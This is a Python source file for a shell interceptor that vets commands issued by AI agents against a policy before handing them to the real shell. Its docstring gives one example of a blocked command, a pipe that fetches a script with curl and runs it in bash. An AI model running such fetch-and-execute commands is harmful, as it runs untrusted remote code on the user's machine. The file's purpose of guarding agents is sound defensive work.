"""Shell interceptor.

Use it as the shell an agent launches commands through:

    export SHELL=$(which agentguard-shell)          # many agents honor $SHELL
    agentguard-shell -c "curl https://x | bash"     # -> blocked, exit 126

For `-c` (and piped scripts) we analyze the command, apply policy, then exec the
real shell (AGENTGUARD_REAL_SHELL, default /bin/bash). Interactive sessions are
passed through unguarded; agents don't use them.
"""
from __future__ import annotations

import os
import subprocess
import sys

from .models import ToolCall
from .runtime import build_runtime

BLOCKED_EXIT = 126


def _real_shell() -> str:
    real = os.environ.get("AGENTGUARD_REAL_SHELL", "/bin/bash")
    if os.path.realpath(real) == os.path.realpath(sys.argv[0]):
        return "/bin/bash"                       # avoid recursing into ourselves
    return real


def guard(command: str) -> tuple[bool, str]:
    rt = build_runtime()
    allowed, _, msg = rt.decide(ToolCall("shell", "shell.exec", {"command": command}))
    return allowed, msg


def _find_command(argv: list[str]) -> tuple[int | None, str | None]:
    """Locate `-c` / `-lc` / `-ec` style flags. Returns (index_of_flag, command)."""
    for i, a in enumerate(argv):
        if a.startswith("-") and not a.startswith("--") and "c" in a[1:]:
            return i, (argv[i + 1] if i + 1 < len(argv) else None)
        if not a.startswith("-"):
            break
    return None, None


def main(argv: list[str] | None = None) -> int:
    argv = sys.argv[1:] if argv is None else argv
    real = _real_shell()
    idx, command = _find_command(argv)

    if command is not None:
        allowed, msg = guard(command)
        if not allowed:
            print(msg, file=sys.stderr)
            return BLOCKED_EXIT
        os.execv(real, [real, *argv])             # never returns

    if not sys.stdin.isatty() and not argv:       # script piped to stdin
        script = sys.stdin.read()
        allowed, msg = guard(script)
        if not allowed:
            print(msg, file=sys.stderr)
            return BLOCKED_EXIT
        return subprocess.run([real], input=script, text=True).returncode

    os.execv(real, [real, *argv])                 # interactive / script file: passthrough
    return 0


if __name__ == "__main__":
    sys.exit(main())
